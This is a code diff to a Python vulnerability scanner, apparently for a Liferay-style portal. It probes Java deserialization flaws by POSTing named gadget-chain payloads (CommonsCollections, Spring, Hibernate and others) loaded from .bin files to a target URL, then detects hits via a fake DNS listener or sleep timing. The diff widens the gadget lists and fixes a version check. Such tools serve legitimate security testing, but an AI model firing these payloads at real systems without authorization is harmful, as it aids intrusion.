@@ -14,6 +14,7 @@ session = requests.Session()
 session.headers.update({
     "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.99"})
 
+
 # Fake DNS server to catch query while sending DNS java deserialization payloads
 def catch_dns_query():
     global sock
@@ -44,10 +45,10 @@ def ping_deserialization(url):
     print("[DNS Scan]")
     url_reformat = re.sub('.*://', '', url)
     url_reformat = re.sub('([:/]).*', '', url_reformat)
-    list_ping = ["CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2", "CommonsCollections3",
-                 "CommonsCollections4", "Jdk7u21", "ROME", "Spring1", "Spring2", "BeanShell1",
-                 "CommonsCollections5", "CommonsCollections6", "CommonsCollections7", "Groovy1",
-                 "Hibernate1", "Hibernate2", "JRMPClient", "MozillaRhino1", "MozillaRhino2", "Myfaces1", "Vaadin1"]
+    list_ping = ["BeanShell1", "CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2", "CommonsCollections3",
+                 "CommonsCollections4", "CommonsCollections5", "CommonsCollections6", "CommonsCollections7",
+                 "Hibernate1", "Hibernate2", "Jdk7u21", "MozillaRhino1", "MozillaRhino2", "Groovy1",
+                 "JRMPClient", "Myfaces1", "ROME", "Spring1", "Spring2", "Vaadin1"]
 
     for name in list_ping:
         payload = open('core/payload_ping/{}.bin'.format(name), 'rb')
@@ -60,8 +61,10 @@ def ping_deserialization(url):
 # Java Deserialization Sleep Scan
 def sleep_deserialization(url):
     print("[Sleep scan]")
-    list_sleep = ["CommonsBeanUtils", "CommonsCollections1", "CommonsCollections2", "CommonsCollections3",
-                  "CommonsCollections4", "Jdk7u21", "Json1", "ROME", "Spring1", "Spring2"]
+    list_sleep = ["BeanShell1", "CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2",
+                  "CommonsCollections3", "CommonsCollections4", "CommonsCollections5", "CommonsCollections6",
+                  "CommonsCollections7", "Hibernate1", "Jdk7u21", "MozillaRhino1", "MozillaRhino2", "ROME", "Spring1",
+                  "Spring2", "Vaadin1"]
     for name in list_sleep:
         payload = open('core/payload_sleep/{}.bin'.format(name), 'rb')
         rq = session.post(url, data=payload, verify=False)
@@ -161,8 +164,9 @@ class Scan:
                 if info_gathering(self.url) is True:
                     # Vulnerabilities of target
                     print('\033[94m' + "==== Vulnerabilities ====" + '\033[94m')
+                    json_versions = ["6.1.0", "6.0.12", "6.1.10", "6.2.0"]
                     if version is not None:
-                        if "6.1.0" or "6.0.12" or "6.1.10" or "6.2.0" in version:
+                        if any(x in version for x in json_versions):
                             json_api(self.url)
                         if "6.1.0" in version:
                             opensearch(self.url)
@@ -189,27 +193,29 @@ class Scan:
                     print("")
             else:
                 print("[!] Required option is not set!")
-        except OSError:
-            print("[!] Port 53 already in use!")
-            logging.error("[!] Port 53 already in use!")
+        except OSError as os:
+            print("[+] " + str(os))
+            logging.error(os)
         except IndexError:
             print("[!] Url is empty!")
-            logging.error("[!] Url is empty!")
+            logging.error(IndexError)
         except exception.ConnectionError:
-            print("[!] Name or service not known!")
+            print(exception.ConnectionError)
             logging.error("[!] Name or service not known!")
         except exception.InvalidURL and exception.MissingSchema:
             print("[!] Invalid Url - Url must start with http(s)!")
-            logging.error("[!] Invalid Url - Url must start with http(s)!")
+            logging.error(exception.MissingSchema)
         except Exception as ex:
             # print("[!] Something get error see the log file!")
             print(ex)
             logging.error(ex)
 
+
 # Generate scan object
 def scan_choose():
     global scan
     scan = Scan("None", "sleep")
+
 
 # Check if vulnerability's option exists
 def check_exist_option(scan_option):
